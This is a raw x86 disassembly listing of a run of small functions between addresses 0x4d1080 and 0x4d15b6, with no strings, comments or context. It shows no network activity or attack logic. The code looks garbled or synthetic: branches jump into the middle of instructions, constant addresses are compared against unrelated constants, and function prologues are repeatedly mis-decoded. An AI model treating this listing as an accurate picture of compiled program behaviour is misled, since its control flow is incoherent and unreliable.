  4d1080:	pop    edi
  4d1081:	call   DWORD PTR ds:0x4d2020
  4d1087:	call   edi
  4d1089:	add    BYTE PTR [eax],al
  4d108b:	add    BYTE PTR [edi-0x1],bl
  4d108e:	adc    eax,0x4d208c
  4d1093:	call   edi
  4d1095:	add    BYTE PTR [eax],al
  4d1097:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d109d:	sub    esp,0x54
  4d10a0:	lea    ecx,ds:0x4d30e4
  4d10a6:	cmp    ecx,0x258b
  4d10ac:	je     0x4d109b
  4d10ae:	push   ecx
  4d10af:	push   esi
  4d10b0:	push   esi
  4d10b1:	push   edi
  4d10b2:	push   eax
  4d10b3:	call   0x4d1318
  4d10b8:	add    esp,0x10
  4d10bb:	pop    ecx
  4d10bc:	push   ecx
  4d10bd:	mov    edx,0xfffffff4
  4d10c2:	push   edx
  4d10c3:	call   0x4d1374
  4d10c8:	add    esp,0x4
  4d10cb:	pop    ecx
  4d10cc:	push   ecx
  4d10cd:	call   0x4d07a8
  4d10d2:	add    esp,0x4
  4d10d5:	pop    ecx
  4d10d6:	add    esp,0x54
  4d10d9:	pop    ebp
  4d10da:	ret    
  4d10db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10e1:	sub    esp,0x28
  4d10e4:	lea    ebx,ds:0x4d31f0
  4d10ea:	mov    eax,DWORD PTR [ebx-0x108]
  4d10f0:	push   ebx
  4d10f1:	push   DWORD PTR [ebx+0x1c4]
  4d10f7:	push   edi
  4d10f8:	call   0x4d1178
  4d10fd:	add    esp,0x8
  4d1100:	pop    ebx
  4d1101:	push   0x0
  4d1103:	call   0x4d0a54
  4d1108:	add    esp,0x4
  4d110b:	mov    ecx,0x0
  4d1110:	push   ecx
  4d1111:	call   0x4d1024
  4d1116:	add    esp,0x4
  4d1119:	add    esp,0x28
  4d111c:	pop    ebp
  4d111d:	ret    
  4d111e:	add    BYTE PTR [eax],al
  4d1120:	pop    edi
  4d1121:	call   DWORD PTR ds:0x4d2094
  4d1127:	call   edi
  4d1129:	add    BYTE PTR [eax],al
  4d112b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1131:	sub    esp,0x54
  4d1134:	lea    ebx,[edx-0xdc]
  4d113a:	cmp    ebx,0x4dc3
  4d1140:	jbe    0x4d112f
  4d1142:	push   ebx
  4d1143:	push   edx
  4d1144:	push   edi
  4d1145:	call   0x4d145c
  4d114a:	add    esp,0x8
  4d114d:	pop    ebx
  4d114e:	push   0x0
  4d1150:	call   0x4d0cb4
  4d1155:	add    esp,0x4
  4d1158:	mov    eax,0x0
  4d115d:	push   eax
  4d115e:	call   0x4d0a54
  4d1163:	add    esp,0x4
  4d1166:	add    esp,0x54
  4d1169:	pop    ebp
  4d116a:	ret    
  4d116b:	add    BYTE PTR [edi-0x1],bl
  4d116e:	adc    eax,0x4d206c
  4d1173:	call   edi
  4d1175:	add    BYTE PTR [eax],al
  4d1177:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d117d:	sub    esp,0x28
  4d1180:	mov    ecx,0x4d30cc
  4d1185:	cmp    ecx,0x45d3
  4d118b:	jb     0x4d117b
  4d118d:	push   ecx
  4d118e:	mov    ecx,0x0
  4d1193:	push   ecx
  4d1194:	call   0x4d0a54
  4d1199:	add    esp,0x4
  4d119c:	pop    ecx
  4d119d:	push   ecx
  4d119e:	push   DWORD PTR [ecx+0x74]
  4d11a1:	push   DWORD PTR [ecx+0x84]
  4d11a7:	push   edx
  4d11a8:	push   DWORD PTR [ecx+0x30]
  4d11ab:	call   0x4d0a78
  4d11b0:	add    esp,0x10
  4d11b3:	pop    ecx
  4d11b4:	push   ecx
  4d11b5:	lea    ebx,[ecx-0xcc]
  4d11bb:	push   ebx
  4d11bc:	call   0x4d08d4
  4d11c1:	add    esp,0x4
  4d11c4:	test   eax,eax
  4d11c6:	jne    0x4d11b5
  4d11c8:	pop    ecx
  4d11c9:	add    esp,0x28
  4d11cc:	pop    ebp
  4d11cd:	ret    
  4d11ce:	add    BYTE PTR [eax],al
  4d11d0:	mov    edi,edi
  4d11d2:	push   ebp
  4d11d3:	mov    ebp,esp
  4d11d5:	sub    esp,0x30
  4d11d8:	lea    edi,ds:0x4d303c
  4d11de:	mov    DWORD PTR [edi+0x1b4],ebx
  4d11e4:	push   edi
  4d11e5:	mov    ebx,0x0
  4d11ea:	push   ebx
  4d11eb:	call   0x4d1024
  4d11f0:	add    esp,0x4
  4d11f3:	pop    edi
  4d11f4:	push   edi
  4d11f5:	push   DWORD PTR [edi+0xc0]
  4d11fb:	push   DWORD PTR [edi+0x9c]
  4d1201:	push   DWORD PTR [edi+0x198]
  4d1207:	push   DWORD PTR [edi+0x1fc]
  4d120d:	call   0x4d0ccc
  4d1212:	add    esp,0x10
  4d1215:	pop    edi
  4d1216:	push   edi
  4d1217:	mov    esi,0x0
  4d121c:	push   esi
  4d121d:	call   0x4d14e4
  4d1222:	add    esp,0x4
  4d1225:	pop    edi
  4d1226:	add    esp,0x30
  4d1229:	pop    ebp
  4d122a:	ret    
  4d122b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1231:	sub    esp,0x5c
  4d1234:	lea    eax,ds:0x4d31b0
  4d123a:	cmp    eax,0x6943
  4d123f:	jbe    0x4d122f
  4d1241:	push   eax
  4d1242:	push   0x0
  4d1244:	call   0x4d0f48
  4d1249:	add    esp,0x4
  4d124c:	pop    eax
  4d124d:	push   eax
  4d124e:	push   edi
  4d124f:	push   ebx
  4d1250:	call   0x4d09c8
  4d1255:	add    esp,0x8
  4d1258:	pop    eax
  4d1259:	push   eax
  4d125a:	call   0x4d1538
  4d125f:	add    esp,0x4
  4d1262:	pop    eax
  4d1263:	add    esp,0x5c
  4d1266:	pop    ebp
  4d1267:	ret    
  4d1268:	mov    edi,edi
  4d126a:	push   ebp
  4d126b:	mov    ebp,esp
  4d126d:	sub    esp,0x30
  4d1270:	lea    ebx,[eax+0x128]
  4d1276:	mov    DWORD PTR [ebp-0x18],edx
  4d1279:	mov    esi,0x0
  4d127e:	push   esi
  4d127f:	call   0x4d0cb4
  4d1284:	add    esp,0x4
  4d1287:	push   ebx
  4d1288:	push   DWORD PTR [ebx+0x1e0]
  4d128e:	push   edi
  4d128f:	push   DWORD PTR [ebx+0x1b8]
  4d1295:	call   0x4d0fe4
  4d129a:	add    esp,0xc
  4d129d:	pop    ebx
  4d129e:	push   0x0
  4d12a0:	call   0x4d0a54
  4d12a5:	add    esp,0x4
  4d12a8:	add    esp,0x30
  4d12ab:	pop    ebp
  4d12ac:	ret    
  4d12ad:	add    BYTE PTR [eax],al
  4d12af:	add    BYTE PTR [edi-0x1],bl
  4d12b2:	adc    eax,0x4d202c
  4d12b7:	call   edi
  4d12b9:	add    BYTE PTR [eax],al
  4d12bb:	add    BYTE PTR [edi-0x1],bl
  4d12be:	adc    eax,0x4d2044
  4d12c3:	call   edi
  4d12c5:	add    BYTE PTR [eax],al
  4d12c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12cd:	sub    esp,0x58
  4d12d0:	lea    ecx,ds:0x4d3000
  4d12d6:	add    DWORD PTR [ecx+0xbc],esi
  4d12dc:	push   ecx
  4d12dd:	push   DWORD PTR [ecx+0xe4]
  4d12e3:	push   edi
  4d12e4:	push   DWORD PTR [ecx+0x8c]
  4d12ea:	call   0x4d10dc
  4d12ef:	add    esp,0xc
  4d12f2:	pop    ecx
  4d12f3:	push   ecx
  4d12f4:	mov    ebx,0x0
  4d12f9:	push   ebx
  4d12fa:	call   0x4d0df8
  4d12ff:	add    esp,0x4
  4d1302:	pop    ecx
  4d1303:	push   ecx
  4d1304:	mov    edi,0x0
  4d1309:	push   edi
  4d130a:	call   0x4d14e4
  4d130f:	add    esp,0x4
  4d1312:	pop    ecx
  4d1313:	add    esp,0x58
  4d1316:	pop    ebp
  4d1317:	ret    
  4d1318:	mov    edi,edi
  4d131a:	push   ebp
  4d131b:	mov    ebp,esp
  4d131d:	sub    esp,0x24
  4d1320:	lea    eax,ds:0x4d3054
  4d1326:	xor    DWORD PTR [ebp-0x14],ebx
  4d1329:	push   eax
  4d132a:	push   DWORD PTR [eax+0x8c]
  4d1330:	push   edx
  4d1331:	call   0x4d0858
  4d1336:	add    esp,0x8
  4d1339:	pop    eax
  4d133a:	push   eax
  4d133b:	mov    ecx,0x0
  4d1340:	push   ecx
  4d1341:	call   0x4d0cb4
  4d1346:	add    esp,0x4
  4d1349:	pop    eax
  4d134a:	push   eax
  4d134b:	call   0x4d0e04
  4d1350:	add    esp,0x4
  4d1353:	pop    eax
  4d1354:	add    esp,0x24
  4d1357:	pop    ebp
  4d1358:	ret    
  4d1359:	add    BYTE PTR [eax],al
  4d135b:	add    BYTE PTR [edi-0x1],bl
  4d135e:	adc    eax,0x4d2034
  4d1363:	call   edi
  4d1365:	add    BYTE PTR [eax],al
  4d1367:	add    BYTE PTR [edi-0x1],bl
  4d136a:	adc    eax,0x4d2010
  4d136f:	call   edi
  4d1371:	add    BYTE PTR [eax],al
  4d1373:	add    BYTE PTR [edi-0x1],bl
  4d1376:	adc    eax,0x4d2048
  4d137b:	call   edi
  4d137d:	add    BYTE PTR [eax],al
  4d137f:	add    BYTE PTR [edi-0x1],bl
  4d1382:	adc    eax,0x4d2014
  4d1387:	call   edi
  4d1389:	add    BYTE PTR [eax],al
  4d138b:	add    BYTE PTR [edi-0x1],bl
  4d138e:	adc    eax,0x4d2078
  4d1393:	call   edi
  4d1395:	add    BYTE PTR [eax],al
  4d1397:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d139d:	sub    esp,0x4c
  4d13a0:	mov    ecx,0x4d3178
  4d13a5:	mov    esi,DWORD PTR [ecx-0x9c]
  4d13ab:	push   ecx
  4d13ac:	mov    ecx,0x0
  4d13b1:	push   ecx
  4d13b2:	call   0x4d0a6c
  4d13b7:	add    esp,0x4
  4d13ba:	pop    ecx
  4d13bb:	push   ecx
  4d13bc:	push   edi
  4d13bd:	push   edi
  4d13be:	push   eax
  4d13bf:	push   DWORD PTR [ecx+0x60]
  4d13c2:	call   0x4d0c24
  4d13c7:	add    esp,0x10
  4d13ca:	pop    ecx
  4d13cb:	push   ecx
  4d13cc:	mov    ebx,0x0
  4d13d1:	push   ebx
  4d13d2:	call   0x4d1024
  4d13d7:	add    esp,0x4
  4d13da:	pop    ecx
  4d13db:	add    esp,0x4c
  4d13de:	pop    ebp
  4d13df:	ret    
  4d13e0:	pop    edi
  4d13e1:	call   DWORD PTR ds:0x4d2084
  4d13e7:	call   edi
  4d13e9:	add    BYTE PTR [eax],al
  4d13eb:	add    BYTE PTR [edi-0x1],bl
  4d13ee:	adc    eax,0x4d203c
  4d13f3:	call   edi
  4d13f5:	add    BYTE PTR [eax],al
  4d13f7:	add    BYTE PTR [edi-0x1],bl
  4d13fa:	adc    eax,0x4d2090
  4d13ff:	call   edi
  4d1401:	add    BYTE PTR [eax],al
  4d1403:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1409:	sub    esp,0x44
  4d140c:	lea    ecx,ds:0x4d30a4
  4d1412:	cmp    ecx,0x89c
  4d1418:	jb     0x4d1407
  4d141a:	push   ecx
  4d141b:	push   DWORD PTR [ecx+0x118]
  4d1421:	push   edi
  4d1422:	push   DWORD PTR [ecx+0x90]
  4d1428:	push   DWORD PTR [ecx+0x98]
  4d142e:	call   0x4d0924
  4d1433:	add    esp,0x10
  4d1436:	pop    ecx
  4d1437:	push   ecx
  4d1438:	mov    edx,0xfffffff4
  4d143d:	push   edx
  4d143e:	call   0x4d1374
  4d1443:	add    esp,0x4
  4d1446:	pop    ecx
  4d1447:	push   ecx
  4d1448:	mov    edx,0x0
  4d144d:	push   edx
  4d144e:	call   0x4d0a54
  4d1453:	add    esp,0x4
  4d1456:	pop    ecx
  4d1457:	add    esp,0x44
  4d145a:	pop    ebp
  4d145b:	ret    
  4d145c:	mov    edi,edi
  4d145e:	push   ebp
  4d145f:	mov    ebp,esp
  4d1461:	sub    esp,0x60
  4d1464:	lea    eax,ds:0x4d3014
  4d146a:	or     esi,DWORD PTR [eax+0xe8]
  4d1470:	push   eax
  4d1471:	push   0x0
  4d1473:	call   0x4d1024
  4d1478:	add    esp,0x4
  4d147b:	pop    eax
  4d147c:	push   eax
  4d147d:	push   DWORD PTR [eax+0x68]
  4d1480:	push   DWORD PTR [eax+0x1c]
  4d1483:	call   0x4d0f98
  4d1488:	add    esp,0x8
  4d148b:	pop    eax
  4d148c:	push   eax
  4d148d:	mov    eax,0x0
  4d1492:	push   eax
  4d1493:	call   0x4d0cc0
  4d1498:	add    esp,0x4
  4d149b:	pop    eax
  4d149c:	add    esp,0x60
  4d149f:	pop    ebp
  4d14a0:	ret    
  4d14a1:	add    BYTE PTR [eax],al
  4d14a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14a9:	sub    esp,0x28
  4d14ac:	lea    edi,ds:0x4d303c
  4d14b2:	xor    edx,0xffffff93
  4d14b5:	push   edi
  4d14b6:	push   ecx
  4d14b7:	push   DWORD PTR [edi+0x174]
  4d14bd:	push   DWORD PTR [edi+0x4]
  4d14c0:	call   0x4d0b50
  4d14c5:	add    esp,0xc
  4d14c8:	pop    edi
  4d14c9:	push   edi
  4d14ca:	push   0x0
  4d14cc:	call   0x4d12b0
  4d14d1:	add    esp,0x4
  4d14d4:	pop    edi
  4d14d5:	push   edi
  4d14d6:	call   0x4d07a8
  4d14db:	add    esp,0x4
  4d14de:	pop    edi
  4d14df:	add    esp,0x28
  4d14e2:	pop    ebp
  4d14e3:	ret    
  4d14e4:	pop    edi
  4d14e5:	call   DWORD PTR ds:0x4d2030
  4d14eb:	call   edi
  4d14ed:	add    BYTE PTR [eax],al
  4d14ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14f5:	sub    esp,0x24
  4d14f8:	mov    edi,0x4d3044
  4d14fd:	adc    esi,DWORD PTR [ebp-0x1c]
  4d1500:	push   edi
  4d1501:	push   0x0
  4d1503:	call   0x4d1080
  4d1508:	add    esp,0x4
  4d150b:	pop    edi
  4d150c:	push   edi
  4d150d:	push   eax
  4d150e:	push   DWORD PTR [edi+0x1b8]
  4d1514:	push   DWORD PTR [edi+0x1cc]
  4d151a:	call   0x4d0730
  4d151f:	add    esp,0xc
  4d1522:	pop    edi
  4d1523:	push   edi
  4d1524:	mov    ebx,0x0
  4d1529:	push   ebx
  4d152a:	call   0x4d1080
  4d152f:	add    esp,0x4
  4d1532:	pop    edi
  4d1533:	add    esp,0x24
  4d1536:	pop    ebp
  4d1537:	ret    
  4d1538:	pop    edi
  4d1539:	call   DWORD PTR ds:0x4d2038
  4d153f:	call   edi
  4d1541:	add    BYTE PTR [eax],al
  4d1543:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1549:	sub    esp,0x30
  4d154c:	lea    ecx,ds:0x4d3118
  4d1552:	add    eax,edi
  4d1554:	push   ecx
  4d1555:	call   0x4d0e04
  4d155a:	add    esp,0x4
  4d155d:	pop    ecx
  4d155e:	push   ecx
  4d155f:	push   DWORD PTR [ecx]
  4d1561:	push   edx
  4d1562:	push   edi
  4d1563:	call   0x4d07fc
  4d1568:	add    esp,0xc
  4d156b:	pop    ecx
  4d156c:	push   ecx
  4d156d:	push   0x0
  4d156f:	call   0x4d0f48
  4d1574:	add    esp,0x4
  4d1577:	pop    ecx
  4d1578:	add    esp,0x30
  4d157b:	pop    ebp
  4d157c:	ret    
  4d157d:	add    BYTE PTR [eax],al
  4d157f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1585:	sub    esp,0x44
  4d1588:	mov    esi,0x4d3134
  4d158d:	sbb    ecx,DWORD PTR [esi+0x14]
  4d1590:	push   esi
  4d1591:	push   DWORD PTR [esi+0x28]
  4d1594:	push   edi
  4d1595:	call   0x4d0f00
  4d159a:	add    esp,0x8
  4d159d:	pop    esi
  4d159e:	push   0x0
  4d15a0:	call   0x4d0f48
  4d15a5:	add    esp,0x4
  4d15a8:	push   0x0
  4d15aa:	call   0x4d14e4
  4d15af:	add    esp,0x4
  4d15b2:	add    esp,0x44
  4d15b5:	pop    ebp
  4d15b6:	ret    
	...
